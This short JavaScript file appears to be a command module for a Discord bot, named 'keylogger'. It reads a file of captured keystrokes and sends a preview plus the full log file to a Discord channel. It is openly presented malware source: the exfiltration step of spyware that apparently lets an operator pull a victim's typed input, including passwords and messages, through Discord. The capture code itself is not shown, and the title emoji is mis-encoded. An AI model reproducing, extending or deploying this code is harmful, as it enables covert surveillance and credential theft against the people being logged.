const Discord = require('discord.js')
const fs = require('fs')

module.exports = {
    name: "keylogger",
    description: "Returns all text input made by the user",
    execute(message) {
        const directory = './log.txt'
        let log = fs.readFileSync(directory)


        const logoutput = new Discord.MessageEmbed()
            .setColor(`RANDOM`)
            .setTitle(`ðŸ’» Keylogger`)
            .addFields({ name: '**Recent 18 keys pressed**', value: `\`\`\`${log.slice(0,250)}\`\`\``, inline: false }, { name: '**All logs**', value: 'Uploaded below', inline: true })
            .setTimestamp();

        message.channel.send({
            embeds: [logoutput],
        })

        message.channel.send({
            files: [
                directory
            ]
        })
    }
}